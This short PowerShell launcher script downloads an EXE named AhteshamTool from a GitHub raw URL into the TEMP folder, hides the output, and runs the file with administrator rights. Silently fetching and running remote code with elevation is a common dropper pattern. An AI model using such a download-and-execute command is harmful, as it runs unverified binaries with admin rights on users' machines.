# ===============================
# AhteshamTool PowerShell Launcher
# ===============================

# Set download URL for the EXE file
$exeUrl = "https://raw.githubusercontent.com/Ahteshamknr/AhteshamTool/main/AhteshamTool.exe"
$exePath = "$env:TEMP\AhteshamTool.exe"

# Silently download the EXE to TEMP
Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing > $null 2>&1

# Silently run the tool as administrator
Start-Process -FilePath $exePath -Verb RunAs
